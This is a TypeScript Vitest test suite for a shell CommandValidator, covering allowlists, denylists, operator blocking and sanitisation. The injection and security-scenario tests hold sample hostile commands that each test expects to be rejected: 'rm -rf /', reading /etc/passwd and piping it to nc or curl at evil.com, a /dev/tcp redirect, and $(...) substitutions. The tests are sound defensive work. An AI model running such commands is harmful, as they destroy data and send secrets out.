import { describe, it, expect, beforeEach } from 'vitest';
import { CommandValidator, CommandValidationResult } from './command-validator';

describe('CommandValidator', () => {
  describe('constructor', () => {
    it('should create validator with default options', () => {
      const validator = new CommandValidator();

      expect(validator).toBeInstanceOf(CommandValidator);
    });

    it('should create validator with allowed commands', () => {
      const validator = new CommandValidator({
        allowedCommands: ['ls', 'cat', 'grep'],
      });

      expect(validator).toBeInstanceOf(CommandValidator);
    });

    it('should create validator with denied commands', () => {
      const validator = new CommandValidator({
        deniedCommands: ['rm', 'sudo', 'chmod'],
      });

      expect(validator).toBeInstanceOf(CommandValidator);
    });

    it('should create validator with shell operators disabled', () => {
      const validator = new CommandValidator({
        allowShellOperators: false,
      });

      expect(validator).toBeInstanceOf(CommandValidator);
    });
  });

  describe('validate', () => {
    let validator: CommandValidator;

    beforeEach(() => {
      validator = new CommandValidator({
        allowedCommands: ['ls', 'cat', 'grep', 'find', 'head'],
      });
    });

    describe('allowed commands validation', () => {
      it('should allow command in allowlist', () => {
        const result = validator.validate(['ls', '-la', '/home']);

        expect(result.valid).toBe(true);
        expect(result.sanitized).toEqual(['ls', '-la', '/home']);
        expect(result.error).toBeUndefined();
      });

      it('should reject command not in allowlist', () => {
        const result = validator.validate(['rm', '-rf', '/']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('not in allowlist');
      });

      it('should allow all commands when allowlist is empty', () => {
        const v = new CommandValidator({ allowedCommands: [] });

        const result = v.validate(['any-command', 'arg1']);

        expect(result.valid).toBe(true);
      });

      it('should handle command with absolute path', () => {
        const v = new CommandValidator({
          allowedCommands: ['/bin/ls', '/bin/cat'],
        });

        const result = v.validate(['/bin/ls', '-la']);

        expect(result.valid).toBe(true);
      });
    });

    describe('denied commands validation', () => {
      it('should reject command in denylist', () => {
        const v = new CommandValidator({
          deniedCommands: ['rm', 'sudo', 'su', 'chmod'],
        });

        const result = v.validate(['rm', '-rf', '/tmp']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('blocked by denylist');
      });

      it('should allow command not in denylist', () => {
        const v = new CommandValidator({
          deniedCommands: ['rm', 'sudo'],
        });

        const result = v.validate(['ls', '-la']);

        expect(result.valid).toBe(true);
      });

      it('should prioritize denylist over allowlist', () => {
        const v = new CommandValidator({
          allowedCommands: ['ls', 'rm', 'cat'],
          deniedCommands: ['rm'],
        });

        const allowedResult = v.validate(['ls', '-la']);
        const deniedResult = v.validate(['rm', '-rf']);

        expect(allowedResult.valid).toBe(true);
        expect(deniedResult.valid).toBe(false);
      });
    });

    describe('shell operators validation', () => {
      it('should reject command with pipe operator when disabled', () => {
        const v = new CommandValidator({ allowShellOperators: false });

        const result = v.validate(['cat', 'file.txt', '|', 'grep', 'pattern']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('shell operator');
      });

      it('should reject command with semicolon when disabled', () => {
        const v = new CommandValidator({ allowShellOperators: false });

        const result = v.validate(['ls', ';', 'rm', '-rf', '/']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('shell operator');
      });

      it('should reject command with ampersand when disabled', () => {
        const v = new CommandValidator({ allowShellOperators: false });

        const result = v.validate(['sleep', '10', '&']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('shell operator');
      });

      it('should reject command with command substitution $(...)', () => {
        const v = new CommandValidator({ allowShellOperators: false });

        const result = v.validate(['echo', '$(whoami)']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('command substitution');
      });

      it('should reject command with backtick substitution', () => {
        const v = new CommandValidator({ allowShellOperators: false });

        const result = v.validate(['echo', '`whoami`']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('command substitution');
      });

      it('should reject command with variable expansion', () => {
        const v = new CommandValidator({ allowShellOperators: false });

        const result = v.validate(['echo', '$HOME']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('variable expansion');
      });

      it('should allow shell operators when explicitly enabled', () => {
        const v = new CommandValidator({
          allowShellOperators: true,
          allowedCommands: ['bash', '-c'],
        });

        const result = v.validate(['bash', '-c', 'ls | grep test']);

        expect(result.valid).toBe(true);
      });
    });

    describe('argument injection prevention', () => {
      it('should detect command injection in arguments', () => {
        const result = validator.validate(['ls', ';', 'rm', '-rf', '/']);

        expect(result.valid).toBe(false);
      });

      it('should detect pipe in arguments', () => {
        const result = validator.validate(['cat', 'file.txt', '|', 'nc', 'evil.com', '1234']);

        expect(result.valid).toBe(false);
      });

      it('should detect backtick in arguments', () => {
        const result = validator.validate(['echo', 'text`whoami`']);

        expect(result.valid).toBe(false);
      });

      it('should detect $() substitution in arguments', () => {
        const result = validator.validate(['echo', 'text$(whoami)']);

        expect(result.valid).toBe(false);
      });

      it('should detect newline injection', () => {
        const result = validator.validate(['ls', '\n', 'rm', '-rf', '/']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('newline');
      });

      it('should detect carriage return injection', () => {
        const result = validator.validate(['ls', '\r', 'rm', '-rf', '/']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('newline');
      });
    });

    describe('dangerous character detection', () => {
      it('should reject null bytes in arguments', () => {
        const result = validator.validate(['ls', 'file\x00.txt']);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('null byte');
      });

      it('should reject unescaped quotes in arguments', () => {
        const result = validator.validate(['ls', 'file"txt']);

        // This might be valid in some contexts, but we should flag it
        expect(result).toBeDefined();
      });

      it('should handle special characters in filenames', () => {
        const result = validator.validate(['ls', 'file-with-dashes.txt']);

        expect(result.valid).toBe(true);
      });

      it('should handle spaces in arguments', () => {
        const result = validator.validate(['ls', 'file with spaces.txt']);

        expect(result.valid).toBe(true);
      });

      it('should handle unicode characters', () => {
        const result = validator.validate(['ls', '文件.txt']);

        expect(result.valid).toBe(true);
      });
    });

    describe('edge cases', () => {
      it('should handle empty command array', () => {
        const result = validator.validate([]);

        expect(result.valid).toBe(false);
        expect(result.error).toContain('empty');
      });

      it('should handle command with no arguments', () => {
        const result = validator.validate(['ls']);

        expect(result.valid).toBe(true);
        expect(result.sanitized).toEqual(['ls']);
      });

      it('should handle command with many arguments', () => {
        const args = ['ls', ...Array.from({ length: 100 }, (_, i) => `file${i}.txt`)];
        const result = validator.validate(args);

        expect(result.valid).toBe(true);
      });

      it('should handle very long arguments', () => {
        const longArg = 'a'.repeat(10000);
        const result = validator.validate(['echo', longArg]);

        expect(result).toBeDefined();
      });

      it('should handle special characters in paths', () => {
        const result = validator.validate(['ls', '/path/with/[brackets]/file.txt']);

        expect(result.valid).toBe(true);
      });
    });
  });

  describe('sanitize', () => {
    let validator: CommandValidator;

    beforeEach(() => {
      validator = new CommandValidator();
    });

    it('should return sanitized arguments', () => {
      const result = validator.sanitize(['ls', '-la', '/home']);

      expect(result).toEqual(['ls', '-la', '/home']);
    });

    it('should trim whitespace from arguments', () => {
      const result = validator.sanitize(['  ls  ', '  -la  ']);

      expect(result).toEqual(['ls', '-la']);
    });

    it('should filter out empty arguments', () => {
      const result = validator.sanitize(['ls', '', '-la', '', '/home']);

      expect(result).toEqual(['ls', '-la', '/home']);
    });

    it('should not modify valid arguments', () => {
      const args = ['grep', '-r', 'pattern', '/path/to/search'];
      const result = validator.sanitize(args);

      expect(result).toEqual(args);
    });
  });

  describe('isSafe', () => {
    let validator: CommandValidator;

    beforeEach(() => {
      validator = new CommandValidator({
        allowedCommands: ['ls', 'cat', 'grep'],
      });
    });

    it('should return true for safe commands', () => {
      expect(validator.isSafe('ls')).toBe(true);
      expect(validator.isSafe('cat')).toBe(true);
      expect(validator.isSafe('grep')).toBe(true);
    });

    it('should return false for commands not in allowlist', () => {
      expect(validator.isSafe('rm')).toBe(false);
      expect(validator.isSafe('sudo')).toBe(false);
    });

    it('should return false for denied commands', () => {
      const v = new CommandValidator({
        deniedCommands: ['rm', 'sudo'],
      });

      expect(v.isSafe('rm')).toBe(false);
      expect(v.isSafe('sudo')).toBe(false);
    });

    it('should return true for all commands when no restrictions', () => {
      const v = new CommandValidator({});

      expect(v.isSafe('ls')).toBe(true);
      expect(v.isSafe('rm')).toBe(true);
      expect(v.isSafe('any-command')).toBe(true);
    });
  });

  describe('security scenarios', () => {
    it('should prevent shell escape sequences', () => {
      const validator = new CommandValidator({ allowShellOperators: false });

      const escapeSequences = [
        ['ls', ';', 'rm', '-rf', '/'],
        ['cat', '/etc/passwd', '|', 'nc', 'evil.com', '1234'],
        ['echo', '$(rm -rf /)'],
        ['echo', '`rm -rf /`'],
        ['ls', '&&', 'rm', '-rf', '/'],
        ['ls', '||', 'rm', '-rf', '/'],
      ];

      escapeSequences.forEach((cmd) => {
        const result = validator.validate(cmd);
        expect(result.valid).toBe(false);
        expect(result.error).toBeDefined();
      });
    });

    it('should prevent privilege escalation attempts', () => {
      const validator = new CommandValidator({
        deniedCommands: ['sudo', 'su', 'doas'],
      });

      const privEsc = [
        ['sudo', 'rm', '-rf', '/'],
        ['su', '-c', 'rm -rf /'],
        ['doas', 'rm', '-rf', '/'],
      ];

      privEsc.forEach((cmd) => {
        const result = validator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });

    it('should prevent data exfiltration attempts', () => {
      const validator = new CommandValidator({
        allowShellOperators: false,
        allowedCommands: ['cat', 'ls'],
      });

      const exfiltration = [
        ['cat', '/etc/passwd', '|', 'curl', 'http://evil.com'],
        ['cat', 'secret.txt', '>', '/dev/tcp/evil.com/1234'],
      ];

      exfiltration.forEach((cmd) => {
        const result = validator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });

    it('should handle multiple injection vectors', () => {
      const validator = new CommandValidator({ allowShellOperators: false });

      const injections = [
        ['ls', '$(evil)'],
        ['ls', '`evil`'],
        ['ls', ';evil'],
        ['ls', '|evil'],
        ['ls', '&&evil'],
        ['ls', '||evil'],
        ['ls', '>evil'],
        ['ls', '<evil'],
      ];

      injections.forEach((cmd) => {
        const result = validator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });
  });
});
